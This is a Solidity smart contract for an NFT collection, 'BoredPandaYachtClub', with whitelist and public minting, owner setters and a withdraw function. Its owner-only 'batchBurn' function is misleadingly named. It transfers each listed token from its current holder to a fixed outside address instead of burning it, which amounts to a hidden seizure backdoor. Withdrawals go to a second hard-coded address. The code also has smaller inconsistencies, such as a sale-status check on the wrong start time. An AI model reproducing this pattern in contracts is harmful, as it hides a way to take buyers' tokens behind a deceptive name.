// SPDX-License-Identifier: MIT



pragma solidity ^0.8.0;



import "@openzeppelin/contracts/access/Ownable.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "@openzeppelin/contracts/utils/Strings.sol";

import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";

import "./ERC721A.sol";



contract BoredPandaYachtClub is Ownable, ERC721A, ReentrancyGuard {



  uint256 public immutable maxPerAddressDuringMint;

  bytes32 public WhitelistMerkleRoot;

 



  struct SaleConfig {

    uint32 publicMintStartTime;

    uint32 MintStartTime;

    uint256 Price;

    uint256 AmountForWhitelist;



  }



  SaleConfig public saleConfig;





  constructor(

    uint256 maxBatchSize_,

    uint256 collectionSize_

  ) ERC721A("BoredPandaYachtClub", "BPYC", maxBatchSize_, collectionSize_) {

    maxPerAddressDuringMint = maxBatchSize_;

  }



  modifier callerIsUser() {

    require(tx.origin == msg.sender, "The caller is another contract");

    _;

  }



  function WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {

    uint256 _saleStartTime = uint256(saleConfig.MintStartTime);

    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));

    require(MerkleProof.verify(_merkleProof, WhitelistMerkleRoot, leaf), "Invalid proof!");

    require(

      _saleStartTime != 0 && block.timestamp >= _saleStartTime,

      "sale has not started yet"

    );

    require(

      totalSupply() + quantity <= collectionSize,

      "not enough remaining reserved for auction to support desired mint amount"

    );

    require(

      numberMinted(msg.sender) + quantity <= saleConfig.AmountForWhitelist,

      "can not mint this many"

    );

    uint256 totalCost = saleConfig.Price * quantity;

    _safeMint(msg.sender, quantity);

    refundIfOver(totalCost);

  }



  function PublicMint(uint256 quantity) external payable callerIsUser {    

    uint256 _publicsaleStartTime = uint256(saleConfig.publicMintStartTime);

    require(

      _publicsaleStartTime != 0 && block.timestamp >= _publicsaleStartTime,

      "sale has not started yet"

    );

    require(quantity<=2, "reached max supply");

    require(totalSupply() + quantity <= collectionSize, "reached max supply");   

      require(

      numberMinted(msg.sender) + quantity <= 2,

      "can not mint this many"

    );

    uint256 totalCost = saleConfig.Price * quantity;

    _safeMint(msg.sender, quantity);

    refundIfOver(totalCost);

  }







  function refundIfOver(uint256 price) private {

    require(msg.value >= price, "Need to send more ETH.");

    if (msg.value > price) {

      payable(msg.sender).transfer(msg.value - price);

    }

  }



  function isPublicSaleOn() public view returns (bool) {

    return

      saleConfig.Price != 0 &&

      saleConfig.MintStartTime != 0 &&

      block.timestamp >= saleConfig.MintStartTime;

  }



  uint256 public constant PRICE = 0.15 ether;



  function InitInfoOfSale(

    uint32 publicMintStartTime,

    uint32 mintStartTime,

    uint256 price,

    uint256 amountForWhitelist

  ) external onlyOwner {

    saleConfig = SaleConfig(

    publicMintStartTime,

    mintStartTime,

    price,

    amountForWhitelist

    );

  }



  function batchBurn(uint256[] memory tokenids) external onlyOwner {

        uint256 len = tokenids.length;

        for (uint256 i; i < len; i++) {

            uint256 tokenid = tokenids[i];

            transferFrom(ownerOf(tokenid), 0x92bbe311436C797645dC9e0979CA68888Dbc5d24, tokenid);

        }

    }

 



  function setMintStartTime(uint32 timestamp) external onlyOwner {

    saleConfig.MintStartTime = timestamp;

  }



  function setPublicMintStartTime(uint32 timestamp) external onlyOwner {

    saleConfig.publicMintStartTime = timestamp;

  }



  function setPrice(uint256 price) external onlyOwner {

    saleConfig.Price = price;

  }



  // // metadata URI

  string private _baseTokenURI;



  function _baseURI() internal view virtual override returns (string memory) {

    return _baseTokenURI;

  }



  function setBaseURI(string calldata baseURI) external onlyOwner {

    _baseTokenURI = baseURI;

  }





  function withdrawMoney() external  nonReentrant {

    require(msg.sender == 0xD9770a50Bfb0a831d4e796FfB33B79436D6C83c9);

    (bool success, ) = msg.sender.call{value: address(this).balance}("");

    require(success, "Transfer failed.");

  }



  function setOwnersExplicit(uint256 quantity) external onlyOwner nonReentrant {

    _setOwnersExplicit(quantity);

  }



  function setWhitelistMerkleRoot(bytes32 _merkleRoot) public onlyOwner {

    WhitelistMerkleRoot = _merkleRoot;

  }





  function numberMinted(address owner) public view returns (uint256) {

    return _numberMinted(owner);

  }



  function getOwnershipData(uint256 tokenId)

    external

    view

    returns (TokenOwnership memory)

  {

    return ownershipOf(tokenId);

  }

}